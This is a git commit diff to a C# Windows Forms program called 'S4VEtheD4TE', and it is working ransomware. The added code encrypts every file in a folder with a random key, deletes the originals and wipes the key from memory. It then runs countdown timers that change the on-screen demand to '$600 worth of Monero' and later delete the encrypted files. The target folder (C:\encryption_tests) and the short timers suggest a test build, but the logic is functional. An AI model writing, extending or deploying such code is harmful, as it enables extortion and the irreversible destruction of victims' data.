adc467520b3762b0387c7463520399eb074952f8
Leonardo <leonardo.aa88@gmail.com>
2022-04-25 17:12:04 -0300

    Implemented file deletion and refactoring

--- Main.cs
+++ Main.cs
@@ -1,26 +1,11 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Timers;
 using System.Diagnostics;
-using System.IO;
-using System.Security.Cryptography;
-using System.Runtime.InteropServices;
 
 namespace S4VEtheD4TE
 {
     public partial class Main : Form
     {
-        //  Call this function to remove the key from memory after use for security
-        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
-        public static extern bool ZeroMemory(IntPtr Destination, int Length);
-
         TimeSpan duration1;
         TimeSpan duration2;
         TimeSpan oneSecond = new TimeSpan(0, 0, 1);
@@ -42,34 +27,13 @@ namespace S4VEtheD4TE
             // Check for first use
             if (Properties.Settings.Default.FirstUse == true)
             {
-                // Encrypt files
-                Encryption encryption = new Encryption();
-
-                // Generates random string
-                string password = encryption.RandomString(64);
-                //Console.WriteLine(password);
-
-                // For additional security Pin the password of your files
-                GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
-
-                string folderPath = @"C:\encryption_tests";
-
-                foreach (string file in Directory.GetFiles(folderPath, "*.*"))
-                {
-                    // Encrypt the file
-                    encryption.FileEncrypt(file, password);
-
-                    // Deletes original file
-                    File.Delete(file);
-                }
-
-                // To increase the security of the encryption, delete the given password from the memory !
-                ZeroMemory(gch.AddrOfPinnedObject(), password.Length * 2);
-                gch.Free();
+                Utils.EncryptFiles();
 
                 // set properties
-                duration1 = new TimeSpan(3, 0, 0, 0);
-                duration2 = new TimeSpan(7, 0, 0, 0);
+                //duration1 = new TimeSpan(3, 0, 0, 0);
+                //duration2 = new TimeSpan(7, 0, 0, 0);
+                duration1 = new TimeSpan(0, 0, 0, 10);
+                duration2 = new TimeSpan(0, 0, 0, 20);
 
                 Properties.Settings.Default.Reset();
                 Properties.Settings.Default.FirstUse = false;
@@ -83,9 +47,15 @@ namespace S4VEtheD4TE
                 // update time passed since last run
                 TimeSinceLastRun = new TimeSpan(DateTime.Now.Day - Properties.Settings.Default.DateLastRun.Day, DateTime.Now.Hour - Properties.Settings.Default.DateLastRun.Hour, DateTime.Now.Minute - Properties.Settings.Default.DateLastRun.Minute, DateTime.Now.Second - Properties.Settings.Default.DateLastRun.Second);
 
-                //MessageBox.Show("Elapsed time: " + TimeSinceLastRun.ToString());
-                Properties.Settings.Default.TimePriceRaise = Properties.Settings.Default.TimePriceRaise.Subtract(TimeSinceLastRun);
-                Properties.Settings.Default.TimeDeleteFiles = Properties.Settings.Default.TimeDeleteFiles.Subtract(TimeSinceLastRun);
+                // Only update properties if timer has not reached zero
+                if (Properties.Settings.Default.TimePriceRaise != new TimeSpan(0, 0, 0, 0))
+                {
+                    Properties.Settings.Default.TimePriceRaise = Properties.Settings.Default.TimePriceRaise.Subtract(TimeSinceLastRun);
+                }
+                if (Properties.Settings.Default.TimeDeleteFiles != new TimeSpan(0, 0, 0, 0))
+                {
+                    Properties.Settings.Default.TimeDeleteFiles = Properties.Settings.Default.TimeDeleteFiles.Subtract(TimeSinceLastRun);
+                }
                 Properties.Settings.Default.Save();
 
                 // sets durations
@@ -97,8 +67,25 @@ namespace S4VEtheD4TE
 
         private void time1_Tick(object sender, EventArgs e)
         {
-            duration1 = duration1.Subtract(oneSecond);
-            duration2 = duration2.Subtract(oneSecond);
+            // Check if timer has reached zero
+            if (duration1 != new TimeSpan(0, 0, 0, 0))
+            {
+                duration1 = duration1.Subtract(oneSecond);
+            }
+            else
+            {
+                Utils.RaisePrice(labelSendMonero);
+            }
+
+            if (duration2 != new TimeSpan(0, 0, 0, 0))
+            {
+                duration2 = duration2.Subtract(oneSecond);
+            }
+            else
+            {
+                Utils.DeleteFiles();
+            }
+
             Properties.Settings.Default.TimePriceRaise = duration1;
             Properties.Settings.Default.TimeDeleteFiles = duration2;
             Properties.Settings.Default.DateLastRun = DateTime.Now;
--- Utils.cs
+++ Utils.cs
@@ -1,12 +1,43 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Text;
 using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+
 
 namespace S4VEtheD4TE
 {
     public class Utils
     {
+        private static string folderPath = @"C:\encryption_tests";
+
+        //  Call this function to remove the key from memory after use for security
+        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
+        public static extern bool ZeroMemory(IntPtr Destination, int Length);
+
+        public static void EncryptFiles()
+        {
+            // Encrypt files
+            Encryption encryption = new Encryption();
+
+            // Generates random string
+            string password = encryption.RandomString(64);
+
+            // For additional security Pin the password of your files
+            GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
+
+            foreach (string file in Directory.GetFiles(folderPath, "*.*"))
+            {
+                // Encrypt the file
+                encryption.FileEncrypt(file, password);
+
+                // Deletes original file
+                File.Delete(file);
+            }
+
+            // To increase the security of the encryption, delete the given password from the memory !
+            ZeroMemory(gch.AddrOfPinnedObject(), password.Length * 2);
+            gch.Free();
+        }
 
         public static void OpenDefaultBrowser(string URL)
         {
@@ -23,6 +54,20 @@ namespace S4VEtheD4TE
             cmd.StandardInput.Flush();
             cmd.StandardInput.Close();
             cmd.WaitForExit();
+        }
+
+        public static void RaisePrice(System.Windows.Forms.Label label)
+        {
+            label.Text = "Send $600 worth of Monero to this address:";
+        }
+
+        public static void DeleteFiles()
+        {
+            foreach (string file in Directory.GetFiles(folderPath, "*.*"))
+            {
+                // Deletes original files
+                File.Delete(file);
+            }
         }
     }
 }
